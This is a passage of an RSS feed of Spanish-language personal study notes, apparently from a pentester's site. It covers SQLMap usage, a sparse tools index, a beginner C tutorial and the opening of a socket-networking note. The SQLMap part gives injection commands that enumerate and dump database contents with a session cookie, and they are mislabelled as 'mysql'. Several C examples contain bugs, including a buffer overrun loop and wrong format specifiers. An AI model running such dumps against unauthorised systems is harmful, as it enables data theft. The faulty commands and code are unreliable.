<br>Tags: <a href="https://dobliuw.com?query=tag:tools" class="tag" target="_blank" rel="noopener nofollow">#tools</a> <a href="https://dobliuw.com?query=tag:automatic" class="tag" target="_blank" rel="noopener nofollow">#automatic</a>
<br><br><br>SQLMap es una herramienta de pruebas de penetración de código abierto que se utiliza para detectar y explotar vulnerabilidades de inyección SQL en aplicaciones web. Esta herramienta se basa en un motor de inyección SQL altamente automatizado que puede detectar y explotar una amplia variedad de vulnerabilidades de inyección SQL en diferentes sistemas de gestión de bases de datos. <br>SQLMap se utiliza para probar la seguridad de aplicaciones web que utilizan bases de datos, identificando y aprovechando vulnerabilidades de inyección SQL. Para hacer esto, SQLMap realiza una exploración automatizada de la aplicación web, identifica las vulnerabilidades de inyección SQL y explota estas vulnerabilidades para extraer información confidencial que podría ser utilizada por un atacante malintencionado para comprometer la seguridad de la aplicación. <br>Al utilizar SQLMap, lo profesionales de seguridad pueden identificar y corregir las vulnerabilidades de inyección SQL en sus aplicaciones web, lo que mejora significativamente la seguridad de estas aplicaciones. También pueden utilizar SQLMap para realizar pruebas de penetración en aplicaciones web de terceros y así evaluar su nivel de seguridad que trabaja en pruebas de penetración de aplicaciones web y en la detección de vulnerabilidades de inyección SQL.<br><br><br>Por ejemplo, podríamos estar logeados en una página la cual es vulnerable a <a data-href="SQLI - (SQL Injections)" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/2.-explotation/vulnerabilities/sqli-(sql-injections).html" class="internal-link" target="_self" rel="noopener nofollow">SQLI - (SQL Injections)</a> y hacer uso de SQLMap para automatizar las inyecciones de manera automatica: <br><br>mysql -u http://{url} --dbs --cookie "PHPSESSID=dklsajfjkadsjfkjajdkjadjka"
Copy<br><br>mysql -u http://{url} --dbs --cookie "PHPSESSID=dklsajfjkadsjfkjajdkjadjka" -dbms mysql 
Copy<br><br>mysql -u http://{url} --dbs --cookie "PHPSESSID=dklsajfjkadsjfkjajdkjadjka" --batch 
Copy<br><br>mysql -u http://{url} --cookie "PHPSESSID=dklsajfjkadsjfkjajdkjadjka" -D {db_name} --tables
Copy<br><br>mysql -u http://{url} --cookie "PHPSESSID=dklsajfjkadsjfkjajdkjadjka" -D {db_name} -T {table_name} --columns
Copy<br><br>mysql -u http://{url} --cookie "PHPSESSID=dklsajfjkadsjfkjajdkjadjka" -D {db_name} -T {table_name} -C {colum1},{column2} --dump
Copy<br><br><br>mysql -u http://{url} --cookie "PHPSESSID=dklsajfjkadsjfkjajdkjadjka" --dbms mysql --risk 4 --level 5
Copy]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/sqlmap.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/Tools/SQLMap.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Tue, 18 Jun 2024 13:33:51 GMT</pubDate></item><item><title><![CDATA[Tools]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tools" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tools</a> <a class="tag" href="https://dobliuw.com/?query=tag:linux" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#linux</a> <a class="tag" href="https://dobliuw.com/?query=tag:windows" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#windows</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tools" class="tag" target="_blank" rel="noopener nofollow">#tools</a> <a href="https://dobliuw.com?query=tag:linux" class="tag" target="_blank" rel="noopener nofollow">#linux</a> <a href="https://dobliuw.com?query=tag:windows" class="tag" target="_blank" rel="noopener nofollow">#windows</a> 
<br><br><br>Es importante aclarar que algunas herramientas son más utilizadas que otras, al punto de tener un uso díario, por lo que requieren y tienen sus apuntes personales, estas son <a data-href="Nmap" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/nmap.html" class="internal-link" target="_self" rel="noopener nofollow">Nmap</a>, <a data-href="Burpsuite" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/burpsuite.html" class="internal-link" target="_self" rel="noopener nofollow">Burpsuite</a><br><br>
<br>


<br>


<br>svn checkout https://github.com/dobliuw/Entorno/trunk/configs
Copy<br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br><br>
<br>


<br>


<br>


<br>


<br>


<br><br>
<br>


<br>


<br><br>
<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br>


<br><br><br>
<br>


<br>


<br>


<br>


<br>


<br><br><br>
<br>


<br>


<br>


]]></description><link>https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/tools/tools.html</link><guid isPermaLink="false">Notes/4. Cybersecurity/RedTeam/Pentesting/Systems/Tools/Tools.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Thu, 04 Apr 2024 17:35:13 GMT</pubDate></item><item><title><![CDATA[C]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:include" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#include</a> 
 <br><br>C es un lenguaje de programación de propósito general, este lenguaje esta orientado a la implementación de sistemas operativos, concretamente Unix.<br>Es importante tener en cuenta y recordar que existen lenguajes de programación compilados vs interpretados, lenguajes de programación interpretados como Python o JavaScript utilizan un interprete el cual ejecuta el código y en tiempo real dado que se va leyendo línea tras línea. Por otro lado lenguajes compilados como C utilizan un compilador (Como gcc o clang) para traducir el archivo escrito en C (file.c) a un archivo de bajo nivel.<br>cd C:\path\to\script\folder

gcc script.c -o final_script

.\final_script
Copy<br><br>Para empezar, hay que tener en cuenta esta línea recurrente en la programación de C, empezando por <a href="https://dobliuw.com?query=tag:include" class="tag" target="_blank" rel="noopener nofollow">#include</a>, es la prefunción que utilizamos para la implementación de otros recursos en nuestro código (Librerias), como lo es import en lenguajes como JavaScript o Python. Siguiendo con &lt;stdio.h&gt; tenemos que dividir esto en 3, por un lado std proveniente de Standard, por otro lado la i, proveniente de Input y por último la o, proveniente de Output, ya que esta libreria contiene funciones estándar de manejo de entradas y salidas, como leer teclado o escribir en consola.<br>#include &lt;stdio.h&gt;
Copy<br>A su vez, C es un lenguaje de programación fuertemente tipado, lo que implica que a diferencia de lenguajes como JavaScript en este caso será constantemente necesario la declaración de tipo de datos que serán las variables, o devolveran las funciones, etc.<br>#include &lt;stdio.h&gt;
#include &lt;stdbool.h&gt; // Library to work with True and False

int age = 20; // %d
float money = 3.141592; // 4 bytes (32 bits of memory) 6-7 digits (%f)
double money2 = 3.1415924324234; // 8 bytes (64 bits of memory) 15-16 digits (%lf)
bool condition = true; // 1 byte (8 bits) true -  false (%d)
char letter = 'a'; // 1 byte (Chars or nums from -128 to +127 = ASCII) %d (The num) or %c (The char)
signed char letter2 = 'a'; // 1 byte (Chars or nums from -128 to +127 = ASCII) %d (The num) or %c (The char)
unsigned char letter3 = 'a'; // 1 byte (Chars or nums from 0 to 255 = ASCII) %d (The num) or %c (The char)
char name[] = "Dobliuw"; // Array of characters %s

const float PI = 3.14159; // Keyword CONST to make a var constant.

void sayHello(){
	printf("Hey you wspp cuz!");
};

int main(){
	// .... code 
	return 0;
};

/*
This is a multiple 
line comment bdw
*/
Copy<br><br>Antes de proseguir con algunos detalles a tener en cuenta en ciertos tipos de datos, es importante tener en cuenta aquellos tipos de datos que estan signed vs aquellos que estan unsigned, ya que esto cambia cómo se interpreta y representa un tipo de datos en términos de su rango de valores permitidos<br>
<br>
Signed: Un tipo de dato signed, como signed char o signed int, etc. puede representar tanto valores positivos como negativos. El bit más alto (El bit más a la izquierda) se utiliza para representar el signo del número lo que significa que un tipo de dato signed tiene un rango que incluye valores negativos , cero y valores positivos.

<br>Ejemplo: signed char tiene un rango de -128 a 127 (1 byte = 8 bits = 2^8 = 256 d pero queda en 255 dado que 1 bit se utiliza para el signo + o -)


<br>
Unsigned: Un tipo de dato unsigned, como unsigned char, unsigned int, etc. solo puede representar valores no negativos (Positivos y cero). El bit más alto se utiliza para representar un valor en lugar de un signo.

<br>Ejemplo: unsigned char tiene un rango de 0 a 255 (1 byte = 8 bits = 2^8 = 256 d)


<br><br>En C, double es un tipo de dato utilizado para representar números con coma con mayor precisión que float. Mientras que float normlamente utiliza 4 bytes (32 bits) para almacenar números con coma, double utiliza 8 bytes (64 bits), lo que proporciona más precisión y un rango más amplio de valores.<br><br>En C, el tipo de dato char se utiliza principalmente para almacenar caracteres individuales. Sin embargo, debido a la forma en que se representa internamente en la memoria, también se puede utilizar para almacenar y manipuara valores numéricos.<br>
<br>Límites: En C, char tiene un rango de -128 a 127 si es signed, de 0 a 255 si es unsigned. 
<br><br>En C, el tipo de dato short se utiliza para representar enteros cortos, es decir, números enteros que requieren menos espacio en memoria que un int que suele tener un total de 4 bytes (En sistemas de 32 bits) = 32 bits = 2^32 = 4.294.967.296 (Recordando que por defecto esta signed, permite un rango de -2.147.483.648 a 2,147,483,647, en caso de estar unsigned de 0 a 4.294.967.295).<br>
<br>Límites: En C, short tiene un rango de -32.768 a 32.767 (2 bytes = 16 bits = 2^16 = 65.536 d pero quedan 65.535 dado que 1 bit se utiliza para el signo + o -).
<br>Si se convina con unsigned es decir, unsigned short recordemos que altera el valor pasando de 0 a 65.535 (2 bytes = 16 bits = 2^16 = 65.536)
<br>Short siempre tendrá un valor de 2 bytes, únicamente en caso de estar signed o unsigned cambia el signo.
<br>En caso de sobrepasarnos el valor disponible a asignar dentro de estos rangos, se reseteara al minimo valor posible (En caso de ser unsigned a -32.768 y en caso de no especificar signed o que lo esté, a 0).<br><br>En C, el tipo de dato long se utiliza para representar números enteros más grandes que los que puede contener int. Es importante tener en cuenta que dependiendo de la arquitectura del sistema operativo long tendrá un total de bytes distinto.<br>
<br>Arquitectura: En sistemas operativos de 32 bits, long tendrá un total de 4 bytes y un total de 8 bytes en sistemas de 64 bits.
<br>Límites: En C, long tiene un rango de -2.147.483.648 a 2,147,483,647 en caso de estar signed en OS de 32 bits y un total de -9,223,372,036,854,775,808 a 9,223,372,036,854,775,807. en caso de estar signed en OS de 64 bits. En caso de esta unisgned, long tiene un rango de 0 a 4,294,967,295 en sistemas de 32 bits y de 0 a 18,446,744,073,709,551,615 en sistemas de 64 bits.
<br>Es importante tener en cuenta que en sistemas de 32 bits tanto int como long int tendran el mismo tamaño de almacenamiento (4 bytes = 32 bits) y long long int un tamaño de 8 bytes (64 bits) y rango de representación de datos. Mientras que en sistemas de 64 bits:<br>
<br>int = 4 bytes = 32 bits = 2^32 = 4.294.967.296
<br>long int o long = 8 bytes = 64 bits = 2^64 = 18.446.744.073.709.551.616
<br>long long int =  8 bytes = 64 bits = 2^64 = 18.446.744.073.709.551.616
<br>Basicamente, en sistemas de 32 bits los int y los long int / long suelen tener la misma capacidad de espacio en memoria, mientras que en sistemas de 64 bits los long int / long y los long long int suelen tener la misma capacidad de almacenamiento en memoria<br><br>Para representar los distintos tipos de datos haremos uso del % seguido de uno o más caracteres que hagan alución al tipo de dato que se esta intentando representar<br>printf("%c",some_var); // Char
printf("%s",some_var); // Char array (String)
printf("%f",some_var); // Float
printf("%lf",some_var); // Double
printf("%d",some_var); // Bool
printf("%d",some_var); // Char as numeric value (ASCII)
printf("%d",some_var); // Unsigned char as numeric value (ASCII)
printf("%d",some_var); // Short
printf("%d",some_var); // Unsigned short
printf("%d",some_var); // Integer
printf("%u",some_var); // Unsigned integer
printf("%lld",some_var); // Long long integer
printf("%llu",some_var); // Unsigned long long integer
Copy<br><br>Cuando trabajamos con la función printf es fundamental tener conocimiento sobre el formateo de representación de datos, esto nos permite controlar cómo se muestran los datos cuando imprimimos en pantalla los mismos, especificamente detalles como el número de decimales para los números float, la "anchura" (width) de campo para los enteros, etc<br>// For INTEGERS
%d // INT con signo (Decimal)
%i // INT con signo (Decimal)
%u // INT sin signo (Decimal)
%o // INT sin signo (Octal)
%x // INT sin signo (Hexadecimal)
%X // INT sin signo (Hexadecimal)
%{num}d // INT con {num} de espacios a la derecha
%-{num}d // INT con {num} de espacios a la izquierda

// For FLOATS
%f // FLOAT con signo (Decimal)
%e // FLOAT notación científica.
%E // FLOAT notación científica.
%g // FLOAT notación decimal o científica.
%G // FLOAT notación decimal o científica.

// Examples
short int int_var = 255;
float float_var = 4.4325432;

printf("hola%10dhola%-10dhola",int_var,int_var); // hola       255hola255       hola
printf("%.2f",float_var); // 4.43
printf("%-10.3fhola",float_var); // 4.432          hola
Copy<br><br>Las funciones de strings en C son funciones predefinidas en la biblioteca estándar string.h que permite realizar varias operaciones en cadenas de caracteres. <br>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;
char str1[] = "DOBLIUW";
char str2[] = "Gvng";

// Returns a string
strlwr(str1); // dobliuw
strupr(str2); // GVNG
strcat(str1, str2); // DOBLIUWGvng
strncat(str1, str2, 2); // DOBLIUWGv
strcpy(str1, str2); // Convert str1 in str2
strncpy(str1, str2, 2) // GvBLIUW 
strset(str1, '?'); // ?????? (Replace each char for the given one)
strrev(str1); // WUILBOD

// Returns a integer
strlen(str1); // 7
strcmp(str1, str2); // Compare if the strings are equals and if it return 0 else return another number
strncmp(str1, str2, 2) // Compare the first 2 chars of the strings
strcmpi(str1, str2); // Compare if the strings are equals (Ignore case)
strnicmp(str1, str2, 2) // Compare the first 2 chars of the strings (Ignore case)
Copy<br><br>Los operadores aritméticos en C son utilizados para realizar operaciones matemáticas básicas en variables numéricas.<br>+ // Addtion
- // Substraction
* // Multiplication
/ // Division
% // Modulus
++ // Increment
-- // Decrement

int num1 = 5;
int num2 = 2;

int num3 = num1 / num2; // This is equal 2... why? 
float num3 = num1 / (float) num2; // This is equal 2.500000

// Augmented assignment operators
int x = 10;
x+=2; // 12
x-=2; // 10
x*=2; // 20
x/=2; // 10
x%=2; // 0
Copy<br><br>Los punteros en C son una característica poderosa y fundamental en el lenguaje. Un puntero es una varibale que contiene la dirección de memoria de otra variable. En escencia un puntero "apunta" a la ubicación en memoria de otra variable.<br>
<br>Cuando agregamos &amp; delante de una variable se imprimira la dirección en memoria de dicha variable.
<br>Cuando modificamos un puntero sin el * delante, modificaremos el puntero en si.
<br>Cuando modificamos un puntero con el * delante, modifcaremos la variable a la que apunta el puntero.
<br>#include &lt;stdio.h&gt;

void main(){
	short int num1 = 10;
	printf("The 'num1' var have %d value found in %x memory direction.",num1,&amp;num1);
	short int *short_pointer; // We create a pointer (Short int data type)
	short_pointer = &amp;num1; // We asign the same memory direction of num1 var
	*short_pointer = 666; // We modify (With * key) the num1 var through pointer
	printf("The 'num1' var have %d value found in %x memory direction.",num1,&amp;short_pointer);
};
Copy<br><br>En C, las cadenas de caracteres o strings, son secuencias de caracteres terminadas por el carácter nulo '\0' o null byte. La biblioteca estándar de C proporciona varias funciones para trabajar strings.<br>#include &lt;string.h&gt;

char sentence[100] = "This is a random sentences to an example.";
printf("The length of the sentence is %d",strlen(sentence)); // strlen returns the length of the string 

sentence[strlen(sentence) - 1] = '\0'; // Add at then end of string the null byte

Copy<br><br>Para obtener la entrada del usuario en C, utilizamos la función scanf junto con las conversiones adecuadas para el tipo de datos que queremos leer.<br>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

short int age; 
char name[25];

printf("\nHey, what's your name cuz? ");
scanf("%s",&amp;name); // This wouldn't add us whitespaces 
fgets(name, sizeof(name), stdin);// Instead we need use fgets
printf("\nOh ok.. and how old are u %s? ",name);
scanf("%d",&amp;age);
printf("It's a pleasure %s with %d years olds!\n",name,age);
Copy<br><br>La biblioteca math.h en C proporciona una variedad de funciones matemáticas. Estas funciones permiten realizar operaciones matemáticas avanzadas como potencias, raíces, funciones trigonométricas, logaritmos, etc.<br>#include &lt;math.h&gt;

// Square root (Raíz cuadrada)
double raiz_de_veinte = sqrt(20);
printf("%.2lf",raiz_de_veinte) // 4.47
// Pow (Potencia)
double dos_a_la_dieciseis =  pow(2, 16);
printf("%.2lf",dos_a_la_dieciseis); // 65536.00
// Round (Redondear)
int cuatro_redondeado = round(4.14);
printf("%d",cuatro_redondeado); // 4
// Round Up (Redondear para arriba)
int cuatro = ceil(3.14);
printf("%d",cuatro); // 4
// Round Down (Redondear para abajo)
int tres = floor(3.99);
printf("%d",tres); // 3
// Get absolute value 
double cien = fabs(-100);
printf("%.2lf",cien); // 100.00
// Calculate natural logaritm (Calcular logaritmo natural)
double log_natural_de_5 = log(5);
printf("%.2lf",log_natural_de_5); // 1.61

// There are more functions to calculate more matematic things like cosine, tangent, sine
// https://www.programiz.com/c-programming/library-function/math.h
Copy<br><br><br><br>Es una estructura de control fundamental en la mayoría de lenguajes de rpogramación. Sirve para tomar decisiones en fundión de una condición booleana.<br>// ..... code 
if(condition1 == true){
	// .... code
}else if(condition2 == true &amp;&amp; num &lt;= 10){
	// .... code
}else{
	// .... code
};
Copy<br>Por otro lado, el operador ternario, también conocido como operador condicional, es una expresión que se utiliza en algunos lenguajes de programación para tomar decisiones acortando el código a una línea de código. Es una forma concisa de llevar a cabo un if-else. <br>condition1 ? make_something_if_condition_is_true() : make_something_if_condition_is_false();
Copy<br><br>La devalaración switch en C es otra estructura de control que permite tomar decisiones basadas en el valor de una expresión o variable. Es útil cuando se tinen múltiples casos posibles y se quiere ejecutar diferentes bloques de código según el valor de la expresión.<br>#include &lt;stdio.h&gt;
// .... code
char note ;
printf("How much did you get on the exam?");
scanf("%c", &amp;note);

switch(note){
	case 'A':
		printf("OMG! Congratulations, you did it perfect!");
		break;
	case 'B':
		printf("Nice! You did good!");
		break;
	case 'C':
		printf("Well.. You did it okay.");
		break;
	case 'D':
		printf("At least it's not an F...");
		break;
	case 'F':
		printf("Sad... you failed.");
		break;
	default:
		printf("Please enter only a valid note.");
}
Copy<br><br>Una función es un bloque de código que realiza una tarea específica y puede ser llamada desde otras partes del programa. Las funciones ayudan a organizar el código, promueven la reutilización y facilitan la comprensión del programa al dividirlo en partes más pequeñas y manejables.<br>#include &lt;stdio.h&gt;

# Declaration 
int suma(int num1, int num2){
	return sum1 + sum2;
};

# Function call
suma(4, 5);
Copy<br>Tanto para la función como para los argumentos que la misma reciba, se deberá declarar e indicar que tipo de valor se estará haciendo uso.<br>Por otro lado, un function prototype, también conocido como declaración de función, es una declaración que informa al compilador acerca de la existencia y la estrucutra de una función antes que se la llame o defina. Proporciona al compilador la información necesaria sobre el nombre de la función, los tipos de parámetros que recibe y el tipo de valor que devuelve la misma, para que a la hora de hacer uso de esta, en caso de cometer un error ya sea en la cantidad de argumentos, en el tipo de datos de los argumentos y lo que sea, en lugar de obtener un warning obtengamos un error.<br>int suma(int num1, int num2);

int main(){
	// .... code
	suma(4);
};

int suma(int num1, int num2){}
	return num1 + num2;
};
Copy<br>En este caso podemos ver que estamos declarando la función en las primeras líneas, ingresando el cuerpo de la misma al final y llamandola en la función main, en este caso obtendremos un error gracias a que en la primera línea estamos haciendo uso de function prototype y estamos declarando la función y el compilador sabe a lujo y detalle sobre la misma, en caso de no tener esta primera línea, a pesar de estar llamando a la función con un único argumento, esto desembocará en un comportamiento inesperado y un único warning en lugar de un error.<br><br>El bucle for en C es una estructura de control que se utiliza para repetir un bloqeu de código un número específico de veces. Es útil cuando sabemos exactamente cuántas veces se quiere realizar una acción.<br># Structure
for(initialization, condition, update){
	// .... code to execute
}

# Example
for(int counter = 0; counter &lt;= 100; counter++){
	printf("%d\n", counter);
};
# 1
# 2 
# 3
# ....
# 100
Copy<br><br>El bucle while evalúa la condición antes de ejecutar el bloque de código. Si la condición es verdadera, el bloque de cóidog se ejecuta; si la condición es falsa desde el principio, el bloque de código no se ejecuta en absoluto.<br># Strcutre
while(condition){
	// ...code
};

# Example
int age = 1;

while(age &lt;= 18){
	printf("One more year of life! I've %d years old right now.", age);
	age++;
};
# One more year of life! I've 1 years old right now.
# One more year of life! I've 2 years old right now.
# One more year of life! I've 3 years old right now.
# ...........
# One more year of life! I've 18 years old right now.
Copy<br><br>El bucle do-while es similar al bucle while, pero la condición se evalúa después de ejecutar el bloque de código al menos una vez. Esto significa que el bloque de código se ejecutará al menos una vez, incluso si la condición es falsa desde el principio.<br># Structure
do{
	// ...code
}while(condition);

# Example
int i = 100;
do{
	printf("%d",i);
}while(i &gt;= 1000);
# 100
Copy<br><br>Un array es una estructura de datos que puede almacenar una colección de elementos del mismo tipo. Los elementos de un array están dispuestos en una secuencia contigua de memoria, y cada elemento tiene una posición única dentro del array, que se indentifica mediante un índice.<br>int numbers[] = {1,2,3,4,5,6,7,8,9,10};
double prices[5] = {10.0, 14.0, 30.0, 50.0, 5.5};

// Found the lenght:

// We now that the function SIZEOF is used to found the bytes of an array
// sizeof(numbers) = 10.... each item is INT, INT have 4 bytes, 10 itemos * 4 bytes each one = 40 bytes
// So, once knowing the bytes used, we need divide that for the bytes of each item (INT = 4 Bytes)
// 40 bytes (10 items of 4 bytes each one) / 4 bytes (INT) = 10 items

// Create a macro:

#define length(arr) (sizeof(arr) / sizeof(arr[0]))

length(numbers) // 10
Copy<br><br>Un array 2D o array bidimensional, comúnmente conocidcomo como matriz, es una estructura de datos que contiene elementos dispuestos en filas y columnas. En C, se puede pensar en una matriz como un array de arrays, donde cadad elemento del array principal es en sí mismo un array.<br>// Strcuture
data_type array_name[rows][columns];

// Example
int matriz[3][3] = {
	{1, 2, 3},
	{4, 5, 6},
	{7, 8, 9}
};
printf("%d", matriz[1][1]); // 5 


int main(){
    short counter = 1;
    int matriz[5][5];

    for(int i = 0; i &lt; 10; i++){
        for(int j = 0; j &lt; 10; j++){
            matriz[i][j] = counter;
            counter++;
        };
    };

    printf("Matriz created:\n ");

    for(int i = 0; i &lt; length(matriz); i++){
        for(int j = 0; j &lt; length(matriz[0]); j++){
            printf("%d ",matriz[i][j]);
        };
        printf("\n");
    };
};
Copy<br>Este concepto es el utilizado para poder dar lugar al conocido array de strings en C.<br>// Declaration
char string_arr[][10] = {"Dobliuw", "ZaikoARG", "Elswix"};

// Change values
#include &lt;string.h&gt;
strcpy(string_arr[2], "ElswixGOD");
Copy<br><br>El hecho de intercambiar valores de una variable a otra puede ser una técnica que utilizemos cotidianamente al hacer uso de arrays en C.<br>#include &lt;string.h&gt;

char x[] = 'Water';
char y[] = 'Limonade';
char temp[15];

strcpy(temp, x);
strcpy(x, y); // If y have less bytes that x, that would throw and unexpected behavior
strcpy(y, temp);

int array[] = {1,2,3,4,5,6,7,8,9,10};
int size = sizeof(array) / sizeof(array[0])
Copy<br>Un ejemplo de caso de uso sería para el famoso buble sort para ordenar arrays de manera creciente o decreciente:<br>#include &lt;stdio.h&gt;
#include &lt;stdbool.h&gt;
#define get_length(arr) (sizeof(array) / sizeof(array[0]))

void printArr(int arr[], int size, bool n);

int bubleSort(int arr[], int size){
    int temp;
    printf("Array pre sort: ");
    printArr(arr, size, false);
    for(int i=0; i &lt; size - 1; i++){
        printf("\n[!] Checking %d",arr[i]);
        for(int j=0; j &lt; size - i - 1; j++){
            printf("\n\t+ Checking %d and %d",arr[j],arr[j+1]);
            if(arr[j] &lt; arr[j+1]){
                printf("\n\t\t[i] Swap %d for %d",arr[j],arr[j+1]);
                int temp = arr[j];
                arr[j] = arr[j+1];
                arr[j+1] = temp;
            };
        };
        printArr(arr, size, true);
    };
};
 
void printArr(int arr[], int size, bool n){
    n ? printf("\n\n") : (void)0;
    for(int i = 0; i &lt; size; i++){
        printf("%d ", arr[i]);
    };
    n ? printf("\n") : (void)0;
};

int main() {
    int array[] = {4,253,14,45,26,17,81,19,110};
    int length = get_length(array);
    bubleSort(array, length);
    printf("\n[+] Array buble sorted:");
    printArr(array, length, false);
};
Copy<br><br>Los structs en C son una forma de definir un nuevo tipo de datos que puede contener múltiples variables de diferentes tipos. Un struct puede considerarse como una "estructura" de datos qeu agrupa varios elementos relacionados juntos bajo un solo nombre. Se suele decir que este tipo de datos es muy similar a las Clases en lenguajes de otros lenguajes de programación, pero sin la capacidad de contener métodos.<br># Struct declaration
struct Person{
	char name[20];
	int age;
};

# Struct var declaration and asignation
struct Person first_person = {"Dobliuw", 20};
struct Person second_person;

# Access to the members (Atributes in other languages)
printf("The name of the person is %s and have %d years old",first_person.name, first_person.age);

# Asign values to the members of struct
strcpy(second_person.name, "Valentino");
second_person.age = 21; 
Copy<br><br>La palabra reservada typedef en C se utiliza para crear alias o nombres alternativos para tipos de datos existentes. Esto puede hacer que el código sea más legible y fácil de mantener, especialmente cuando se trabaja con tipos de datos largos o complejos.<br># Declaration of alias
#define rows_matriz2x5 2
#define columns_matriz2x5 5
typedef int Matriz2x5[rows_matriz2x5][columns_matriz2x5];

# Using the alias
Matriz2x5 my_first_matriz = {{1,2,3,4,5},{6,7,8,9,10}};

typedef int Entero;
typedef char String_25b[25];

Entero number = 1;
String_25b name = "Dobliuw";

# String array
# Example using typedef of typdef
typedef String_25b String_arr_25x5b[5];
# Example using typdef
typedef char String_arr_15x5b[25][5];

String_arr_25bx5 my_string_arr = {"Dobliuw", "ZaikoARG", "elswix", "Valentino", "Brian"};

Copy<br><br>Los arrays de estructuras son muy útiles cuando se encesita manejar un conjunto de datos relacionados de manera organizada y eficiente. Algunos de susu usos comunes pueden ser la gestión de bases de datos simples, programación de juegos y/o procesamiento de datos. Nos permite mantener un código organizado, eficiente y escalable.<br>#include &lt;stdio.h&gt;
#include &lt;string.h&gt;

// Macro to calculate the length of an array
#define LENGTH(arr) (sizeof(arr) / sizeof((arr)[0]))

// Definition of the structure Student
typedef struct {
    char name[12];
    char age;
} Student;

// Typedef for an array of Students
typedef Student Course[];

int main() {
    // Initializing instances of Student
    Student student1 = {"DobliuW", 15};
    Student student2 = {"Dylan", 13};
    Student student3 = {"Marcos", 15};
    Student student4 = {"Igna", 17};

    // Creating an array of Students
    Course first_course = {student1, student2, student3, student4};

    // Printing the students' information
    printf("The first course has the following students:\n");
    for (int i = 0; i &lt; LENGTH(first_course); i++) {
        printf("- %s, who is %d years old.\n", first_course[i].name, first_course[i].age);
    }

    return 0;
}
Copy<br><br>Los enum son una manera de definir un conjunto de contrasntaes enteras con nombres más descriptivos, lo que mejora la legibilidad y el mantenimiento de código. Se utilizan para representar valores que son descretos y finitos, como días de la semana, estados de una máquina de estados, meses, etc.<br>Un enum se define usando la palabra clave enum seguida por elnombre del enumerador y una lista de idetnficadores (Nombres de constantes) encerrados entre {}, Por defecto los identificadores se asignana a valores enteros consecutivos, empezan por 0, pero estos se pueden cambiar.<br>#include &lt;stdio.h&gt;

enum Day {Mon = 1, Tue = 2, Wed = 3, Thu = 4, Fri = 5, Sat = 6, Sun = 7};

void printDay(enum Day day){
	swtich(day){
	case(Mon): printf("Monday"); break;
	case(Tue): printf("Tuesday"); break;
	case(Wed): printf("Wednesday"); break;
	case(Thu): printf("Thursday"); break;
	case(Fri): printf("Friday"); break;
	case(Sat): printf("Saturday"); break;
	case(Sun): printf("Sundary"); break;
	default: printf("Day not found."); break;
	}
}

int main(){
	enum Day today = Thu;
	printDay(today);
	return 0;
};
Copy<br><br>La función srand() de la librería stdlib.h en C se utiliza para inciializar el generador de números aleatorios. Esta incialización se llama "sembrar" el generador de números aleatorios, y es crucial para obtener secuencias deferentes de números aleatorios en cada ejecución del programa. Esto es porque la función rand() de la librería stdlib.h, genera una secuencia de números basada en "seed/semilla" inicial. Si no se inicializa el generador con srand(), el generador usará una semilla por defecto, lo que provocará que la secuencia de números aleatorios generada por rand() sea la misma en cada ejecución del programa.<br>#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt; // For srand() and rand()
#include &lt;time.h&gt; // For time()

int main(){
	// Generate the number generators based in actual time
	srand(time(0));

	// Generate a 100 random numbers between 80 and 180
	for(int i = 0; i &lt; 101; i++){
		int random_num = rand() % 180 + 80;
		printf("%s", random_num);
	};
	return 0;
};
Copy<br>time(0) devuelve el tiempo actual en segundos desde el 1 de enero de 1970 (también conocido como la época Unix).]]></description><link>https://dobliuw.com/notes/5.-technologies/lenguajes-y-tools/c/c.html</link><guid isPermaLink="false">Notes/5. Technologies/Lenguajes y Tools/C/C.md</guid><dc:creator><![CDATA[Dobliuw]]></dc:creator><pubDate>Fri, 17 May 2024 00:43:54 GMT</pubDate></item><item><title><![CDATA[Conexiones de red y protocolos]]></title><description><![CDATA[<a class="tag" href="https://dobliuw.com/?query=tag:tecnologías" style="background-color: rgb(4, 108, 116); color: white; font-weight: 700; border: none; border-radius: 1em; padding: 0.2em 0.5em;">#tecnologías</a> 
 <br><br>
<br>Tags: <a href="https://dobliuw.com?query=tag:tecnologías" class="tag" target="_blank" rel="noopener nofollow">#tecnologías</a>
<br><br><br>Los protocolos&nbsp;<a data-href="0. TCP" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/tcp/0.-tcp.html" class="internal-link" target="_self" rel="noopener nofollow">0. TCP</a> y&nbsp;<a data-href="0. UDP" href="https://dobliuw.com/notes/4.-cybersecurity/redteam/pentesting/systems/2.-audit-phases/1.-reconnaissance/protocolos/udp/0.-udp.html" class="internal-link" target="_self" rel="noopener nofollow">0. UDP</a> son fundamentales en la comunicación de red, y la librería ‘socket‘ en Python proporciona las herramientas necesarias para interactuar con ellos. Aquí tienes una descripción detallada de ambos protocolos y el uso de ‘socket‘:<br><br><br><br>Un socket es una interfaz de programación de aplicaciones (API) que proporciona una bastracción para la comunicación entre procesos a través de una red, ya sean en la misma máquna o entre máquinas diferentes. Es una forma de establecer conexiones bidireccionales entre porgramas.<br><br>La librería ‘socket‘ en Python es una herramienta esencial para la programación de 